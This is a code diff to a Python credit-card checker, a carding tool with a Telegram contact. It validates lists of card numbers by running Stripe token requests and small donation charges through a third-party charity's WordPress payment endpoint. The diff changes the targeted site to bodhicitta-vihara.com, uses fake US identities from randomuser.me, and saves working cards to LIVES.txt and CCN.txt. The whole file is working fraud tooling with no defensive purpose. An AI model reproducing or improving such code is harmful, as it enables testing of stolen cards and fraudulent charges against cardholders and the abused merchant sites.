@@ -26,20 +26,17 @@ sys.stdout.write(
 ╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║
 ░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
 Welcome To CC Checker.
-Contact me on tg @Xbinner2"""
+Contact me on tg @Xbinner18"""
 )
 
-amount = int(input(f"\namount=> "))
-# p = input("\nproxy remote=> ")
+amount = int(input(f"\nAmount: "))
 
-UA = "Mozilla/5.0 (Android 13; Mobile; rv:68.0) Gecko/68.0 Firefox/107.0"
+UA = "Mozilla/5.0 (Linux; Android 15; SM-S931B Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36"
 
 
 def grab():
-    CC = input("\nlink combo➾ ")
-    cards = requests.get(CC)
-    cc = cards.text.split("\n")
-    return cc
+    with open("cc.txt", "r") as f:
+        return f.readlines()
 
 
 def chk(CCN, MM, YY, CVV):
@@ -56,8 +53,6 @@ def chk(CCN, MM, YY, CVV):
     Sid = r.json()["sid"]
     Muid = r.json()["muid"]
     time.sleep(0.5)
-
-    ip = s.get("https://api.ipify.org/")
 
     res = s.get(f"https://randomuser.me/api?nat=US").json()
     for x in res["results"]:
@@ -83,10 +78,10 @@ def chk(CCN, MM, YY, CVV):
         "guid": Guid,
         "muid": Muid,
         "sid": Sid,
-        "key": "pk_live_4WOpSHSn6SRZyq1Lgv7Zm4Or",
+        "key": "pk_live_O3y87dwNr24VjLNOQqYBMnw7",
         "card[number]": int(CCN),
         "card[cvc]": int(CVV),
-        "card[exp_month]": MM,
+        "card[exp_month]": int(MM),
         "card[exp_year]": int(YY),
     }
 
@@ -95,20 +90,14 @@ def chk(CCN, MM, YY, CVV):
     TYPE = token.json()["card"]["funding"]
     BRAND = token.json()["card"]["brand"]
     COU = token.json()["card"]["country"]
-    time.sleep(1)
-
-    nonce = s.get("https://www.cpadventure.ie/pages/contact-2/", headers=HEADER )
-    form = re.findall(r'formNonce" value="([^\'" >]+)', nonce.text)
 
     load = {
         "action": "wp_full_stripe_payment_charge",
-        "formName": "myform",
-        "formNonce": form[0],
-        "fullstripe_address_line1": Street,
-        "fullstripe_address_city": City,
-        "fullstripe_address_zip": Zip,
-        "fullstripe_address_state": State,
-        "fullstripe_address_country": "US",
+        "formName": "Donation",
+        "isCustom": amount,
+        "formDoRedirect": 1,
+        "showAddress": 0,
+        "sendEmailReceipt": 1,
         "fullstripe_name": Name,
         "fullstripe_email": Email,
         "fullstripe_custom_amount": amount,
@@ -123,30 +112,30 @@ def chk(CCN, MM, YY, CVV):
     }
 
     rx = s.post(
-        "https://www.cpadventure.ie/wp-admin/admin-ajax.php", headers=header, data=load
+        "https://bodhicitta-vihara.com/wp-admin/admin-ajax.php", headers=header, data=load
     )
     msg = rx.json()["msg"]
     
     if "declined" in rx.text:
-        sys.stdout.write(f"\n{colorama.Fore.RED}[DECLINED]|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|{ip.text}|Xbinner2\n")
+        sys.stdout.write(f"\n{colorama.Fore.RED}[DECLINED]|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|Xbinner2\n")
     
     elif rx.json()["success"] == True:
         sys.stdout.write(
-            f"\n{colorama.Fore.GREEN}LIVE|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|{ip.text}|Xbinner2\n"
+            f"\n{colorama.Fore.GREEN}LIVE|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|Xbinner2\n"
         )
         with io.open("LIVES.txt", "a") as f:
-            f.write(f"LIVE|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|{ip.text}|Xbinner2\n")
+            f.write(f"LIVE|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|Xbinner2\n")
 
     elif "security code" in rx.text:
         sys.stdout.write(
-            f"\n{colorama.Fore.BLUE}CCN|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|{ip.text}|Xbinner2\n"
+            f"\n{colorama.Fore.BLUE}CCN|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|Xbinner2\n"
         )
         with io.open("CCN.txt", "a") as f:
-            f.write(f"CCN|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|{ip.text}|Xbinner2\n")
+            f.write(f"CCN|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|Xbinner2\n")
 
     else:
         sys.stdout.write(
-            f"\n{colorama.Fore.RED}[DECLINED]|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{rx.text}|{TYPE}|{BRAND}|{COU}|{ip.text}|Xbinner2\n"
+            f"\n{colorama.Fore.RED}[DECLINED]|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{rx.text}|{TYPE}|{BRAND}|{COU}|Xbinner2\n"
         )
 
 
@@ -161,7 +150,8 @@ def main():
         try:
             chk(CCN, MM, YY, CVV)
             time.sleep(0.5)
-        except:
+        except Exception as e:
+            print(e)
             pass
     print(
         f"\n{colorama.Fore.BLUE}FINISHED! Process done! Checked {colorama.Fore.RED}{len(CARDS)} Tasks\n"
